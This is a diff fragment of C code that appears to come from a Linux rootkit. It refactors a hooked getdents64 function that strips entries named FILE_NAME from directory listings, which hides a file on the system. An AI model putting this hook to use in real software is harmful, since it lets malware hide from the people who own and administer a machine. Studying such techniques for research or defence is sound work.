@@ -21,12 +21,14 @@ searching each filename (linux_dirent64->d_name)
 with the static constant FILE_NAME,
 if it matches recalculating
 what is being returned
-*/
-  int rtn;
-  struct linux_dirent64 *cur = dirp;
-  int i = 0;
-  rtn = getdents64_original(fd, dirp, count);
 
+d_reclen: Size of this dirent
+d_name:   Filename (null-terminated)
+*/
+  struct linux_dirent64 *cur = dirp;
+  int rtn = getdents64_original(fd, dirp, count);
+
+  int i = 0;
   while (i < rtn) {
     if (strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
       int reclen = cur->d_reclen;
@@ -39,6 +41,7 @@ what is being returned
     i += cur->d_reclen;
     cur = (struct linux_dirent*) ((char*)dirp + i);
   }
+
   return rtn;
 }
 
